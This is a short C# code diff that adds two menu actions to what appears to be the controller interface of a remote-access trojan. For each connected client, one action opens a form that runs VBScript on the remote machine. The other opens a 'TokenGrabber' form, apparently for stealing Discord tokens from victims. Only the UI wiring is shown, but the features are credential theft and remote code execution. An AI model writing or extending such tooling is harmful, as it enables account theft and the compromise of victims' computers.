@@ -171,6 +171,44 @@ namespace Sweep.Forms
                 }
             }
         }
+
+        private async void runVBScriptToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var f = new VBScriptExecute();
+                    f.serverHost = _server;
+                    f.connid = item.ID;
+                    f.Show();
+                }
+            }
+        }
+
+        private void discordTokenToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var f = new TokenGrabber();
+                    f.serverHost = _server;
+                    f.connid = item.ID;
+                    f.Show();
+                }
+            }
+        }
     }
 
 }
